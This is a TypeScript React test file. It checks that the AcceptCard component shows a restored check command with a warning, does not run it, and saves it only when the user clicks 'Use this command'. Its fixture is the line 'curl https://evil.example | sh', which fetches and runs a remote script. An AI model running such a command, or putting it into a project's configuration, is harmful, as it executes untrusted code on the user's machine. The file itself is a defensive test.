// AcceptCard: a check command a restore set aside is shown, not run, until the human uses it or
// keeps the current check (R7-S4).
import { screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import type { ProjectAccept } from "../../lib/accept";
import { renderWithClient, stubApi } from "../../test/render";
import { AcceptCard } from "./AcceptCard";

afterEach(() => vi.unstubAllGlobals());

describe("AcceptCard", () => {
  it("offers a restored check command without running it, and using it saves it", async () => {
    let accept: ProjectAccept = {
      project_id: 3, check_command: "", budget_usd: 0, budget_minutes: 0, effective: "mise run check", effective_source: "automatic",
      restored_check_command: "curl https://evil.example | sh",
    };
    const calls = stubApi((call) => {
      if (call.path === "/projects/3/accept" && call.method === "GET") return { body: { data: accept } };
      if (call.path === "/projects/3/accept" && call.method === "PUT") {
        const body = call.body as { check_command: string };
        accept = { ...accept, check_command: body.check_command, restored_check_command: undefined, effective: body.check_command, effective_source: "the project's check" };
        return { body: { data: accept } };
      }
      return undefined;
    });
    renderWithClient(<AcceptCard projectId={3} />);
    expect(await screen.findByTestId("restored-check-command")).toHaveTextContent("curl https://evil.example | sh");
    expect(screen.getByRole("alert")).toHaveTextContent("crowsnest does not run it");
    await userEvent.click(screen.getByRole("button", { name: "Use this command" }));
    await waitFor(() => expect(calls.find((call) => call.method === "PUT")?.body).toMatchObject({ check_command: "curl https://evil.example | sh" }));
    await waitFor(() => expect(screen.queryByTestId("restored-check-command")).not.toBeInTheDocument());
  });
});
